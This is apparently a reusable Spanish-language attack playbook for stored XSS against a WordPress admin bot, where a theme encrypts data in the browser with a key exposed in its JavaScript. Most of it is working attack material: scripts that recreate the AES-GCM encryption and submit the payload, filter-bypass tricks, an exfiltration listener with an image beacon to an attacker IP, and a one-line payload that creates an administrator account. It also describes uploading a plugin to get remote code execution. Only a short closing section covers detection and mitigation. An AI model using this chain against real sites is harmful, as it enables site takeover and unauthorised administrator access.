---
title: XSS al bot admin de WordPress con payload cifrado
tags: [wordpress, xss, aes-gcm, admin-bot, web]
---

# XSS al bot admin de WordPress con payload cifrado

[🇬🇧 English](wp-admin-bot-xss.en.md) | **Español**

> Nota reutilizable. Aplica cuando un tema/plugin cifra datos **en el navegador** con una clave que viaja al cliente, el servidor los descifra y los pinta en el panel de administración.

## Cuándo aplica (checklist)

- [ ] Hay `wp-admin/admin-ajax.php` con acciones propias (`action=...`).
- [ ] `wp_localize_script` / `wp_add_inline_script` exponen un `nonce` en el HTML.
- [ ] El JS del tema contiene la clave (`ENCRYPTION_KEY`, `SECRET`, `PASS`) o una derivación (`crypto.subtle.digest`).
- [ ] Existe un bot admin (chromedriver/puppeteer) que entra cada cierto tiempo.
- [ ] El dato guardado se renderiza **sin escapar** en una página de `wp-admin`.

Si se cumple todo, el cifrado no es una frontera de confianza: es un formato que puedes reproducir.

## 1. Reconocimiento del JS

```bash
# localizar el script que contiene la lógica
curl -s https://target/ | grep -oE 'wp-content/themes/[A-Za-z0-9_-]+' | sort -u
curl -s https://target/wp-content/themes/<tema>/assets/js/app.js -o app.js

# patrones que interesan
grep -nE 'admin-ajax|ajax_url|nonce|encrypt|decrypt|subtle|crypto|FormData' app.js | head -40
```

El nonce suele venir en un objeto localizado dentro del HTML:

```bash
curl -s https://target/ > home.html
grep -o 'var [a-zA-Z_]* *= *{"ajax_url".*}' home.html
```

De ahí salen tres datos: **acción**, **nombre exacto de los campos** y **nonce**. El nombre del campo es donde más gente falla (`payload` vs `encrypted_payload`, `file` vs `voice_recording`): cópialo del `formData.append(...)`, no lo supongas.

## 2. Reproducir el cifrado

Patrón habitual: clave AES-256 = `SHA-256(clave_en_texto)`, IV de 12 bytes, tag al final.

```python
import base64, hashlib, json, os
from Crypto.Cipher import AES

KEY = "<clave del JS>"

def encrypt(obj):
    key = hashlib.sha256(KEY.encode()).digest()
    iv  = os.urandom(12)
    ct, tag = AES.new(key, AES.MODE_GCM, nonce=iv).encrypt_and_digest(json.dumps(obj).encode())
    return base64.b64encode(iv + ct + tag).decode()   # IV | ciphertext | tag
```

Equivalente en Node, útil para comparar byte a byte con el navegador:

```js
const crypto = require('crypto');
const key = crypto.createHash('sha256').update(KEY).digest();
const iv = crypto.randomBytes(12);
const c = crypto.createCipheriv('aes-256-gcm', key, iv);
const ct = Buffer.concat([c.update(JSON.stringify(obj)), c.final()]);
const out = Buffer.concat([iv, ct, c.getAuthTag()]).toString('base64');
```

Detalles que rompen la compatibilidad:

- `crypto.subtle.encrypt({name:'AES-GCM', iv}, key, data)` devuelve **ciphertext‖tag**: el IV va delante y el tag ya está incluido.
- Derivación: `SHA-256` de la clave, no la clave en crudo ni PBKDF2. Compruébalo en el JS (`subtle.digest`) antes de asumir.
- Longitud del IV (12 en GCM), y orden de concatenación.
- `btoa` produce base64 estándar; si el JS usa `base64url`, cambian `+` y `/`.

## 3. Enviar el payload

- **Refresca el nonce en cada intento**: caduca y el endpoint responde `-1` o vacío.
- **Respeta el `Content-Type`**: el navegador usa `FormData` → `multipart/form-data`. En Python, `files={campo: (None, valor)}` fuerza multipart sin adjuntar archivos.
- **Haz el paso previo**: si el flujo genera un `post_id`/`upload_id`, ese ID es lo que valida el endpoint.

```python
import requests
s = requests.Session(); s.verify = False

home  = s.get("https://target/").text
nonce = re.search(r'"nonce"\s*:\s*"([0-9a-zA-Z]+)"', home).group(1)

# paso 1: crear el objeto padre
r = s.post("https://target/wp-admin/admin-ajax.php",
           files={"voice_recording": ("v.wav", wav_bytes, "audio/wav")},
           data={"action": "save_voice_raw", "nonce": nonce})
post_id = r.json()["data"]["post_id"]

# paso 2: enviar el payload cifrado
blob = encrypt({"transcription": "ok", "summary": XSS_HTML})
s.post("https://target/wp-admin/admin-ajax.php",
       files={"action": (None, "save_voice_results"),
              "nonce": (None, nonce),
              "post_id": (None, str(post_id)),
              "encrypted_payload": (None, blob)})
```

## 4. Restricciones del XSS (las que rompen payloads)

| Restricción | Síntoma | Solución |
|---|---|---|
| Render por `innerHTML` | `<script>` no ejecuta, ni error | `<img src=x onerror=...>`, `<svg onload=...>` |
| Escapado de `"` → `&quot;` | JS roto, sin errores en consola | una sola línea, **solo comillas simples** |
| `wpautop` / `nl2br` | `<br>` dentro del atributo | evitar saltos de línea en el payload |
| `wp_kses` | `onerror` desaparece | buscar otro sink permitido (`href`, `srcset`, `<details ontoggle>`) |
| CSP `script-src 'self'` | inline bloqueado | servir el JS desde el propio sitio (subida de archivo) |
| Cookies `HttpOnly` | no puedes reusar la sesión robada | actuar **dentro** del navegador (fetch same-origin) |

Regla práctica: empieza por el beacon más pequeño posible y solo crece cuando lo ves llegar.

## 5. Canal de exfiltración

```python
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse, parse_qs, unquote

class H(BaseHTTPRequestHandler):
    def do_GET(self):
        q = parse_qs(urlparse(self.path).query)
        print("hit:", {k: unquote(v[0]) for k, v in q.items()}, flush=True)
        self.send_response(200); self.end_headers()
        self.wfile.write(b"GIF89a")     # respuesta mínima válida
    def log_message(self, *a): pass

HTTPServer(("0.0.0.0", 8000), H).serve_forever()
```

Beacon:

```html
<img src=x onerror="new Image().src='http://<IP>:8000/?r=ALIVE'">
```

Por qué `new Image()` y no `fetch()` cuando la página es HTTPS: cargar **contenido activo** por HTTP desde HTTPS lo bloquea el navegador (mixed content); una imagen suele pasar. Si necesitas respuestas grandes (nonces, HTML del panel), mejor actuar same-origin y devolver solo un resumen por imagen.

## 6. De XSS a administrador

Dos caminos, ambos con el nonce que el propio bot lee (mismo origen):

**A. Crear un usuario administrador** (`user-new.php`):

```js
fetch('/wp-admin/user-new.php').then(r=>r.text()).then(t=>{var d=new DOMParser().parseFromString(t,'text/html'),n=d.querySelector('[name=_wpnonce_create-user]').value,f=new FormData();f.append('action','createuser');f.append('_wpnonce_create-user',n);f.append('_wp_http_referer','/wp-admin/user-new.php');f.append('user_login','pwned');f.append('email','pwned@target');f.append('pass1','<PASS>');f.append('pass2','<PASS>');f.append('role','administrator');f.append('createuser','Add New User');fetch('/wp-admin/user-new.php',{method:'POST',body:f}).then(r=>r.text())})
```

**B. Subir un plugin** (`plugin-install.php` → `update.php?action=upload-plugin`), más ruidoso pero directo a RCE.

**Verificación sin depender del beacon** (lo fiable):

```bash
curl -sk -c cj.txt -b "wordpress_test_cookie=WP+Cookie+check" \
  --data-urlencode "log=pwned" --data-urlencode "pwd=<PASS>" \
  -d "wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1" \
  https://target/wp-login.php -o /dev/null -w '%{http_code}\n'   # 302 = OK
grep -c wordpress_logged_in cj.txt                              # 1
```

## 7. Errores frecuentes

| Error | Efecto | Cómo detectarlo |
|---|---|---|
| Campo con nombre inventado | `success` pero no guarda nada | comparar con `formData.append` del JS |
| Acción equivocada | respuesta vacía o `0` | leer el `action` literal |
| POST a la raíz del sitio | 200 con la home | usar `admin-ajax.php` |
| Nonce caducado | `-1` / `403` | refrescarlo por petición |
| Salto de línea en el payload | nada se ejecuta | ver el HTML guardado tal cual |
| Esperar respuesta inmediata del bot | "no funciona" falso | el bot puede tardar minutos; mide la cadencia |
| Datos temporales que caducan | el segundo intento falla | repetir el flujo completo |

## 8. Detección y mitigación

Detección:

- Nuevos usuarios con rol `administrator`, sobre todo desde sesiones del bot.
- Peticiones a `user-new.php` / `update.php` con `Referer` del bot o en horarios raros.
- Cambios de integridad en `wp-content` (plugins, `.php` nuevos).
- Payloads HTML dentro de campos que deberían ser texto plano (logs de la BD).

Mitigación:

- Escapar siempre la salida (`esc_html`, `esc_attr`, `wp_kses_post`) y validar capabilities + nonce en el handler AJAX.
- No cifrar secretos en cliente: si el dato es sensible, el secreto vive en servidor.
- `DISALLOW_FILE_MODS` / `DISALLOW_FILE_EDIT` y control estricto de `install_plugins`.
- CSP sin `unsafe-inline`; cookies de sesión `HttpOnly` (ya es el caso) y `Secure`.

## Referencias

- OWASP — Cross Site Scripting: <https://owasp.org/www-community/attacks/xss/>
- WordPress — Nonces y capabilities: <https://developer.wordpress.org/apis/security/nonces/>
- MDN — `SubtleCrypto.encrypt`: <https://developer.mozilla.org/en-US/docs/Web/API/SubtleCrypto/encrypt>
- CWE-79 · CWE-798 · CWE-434
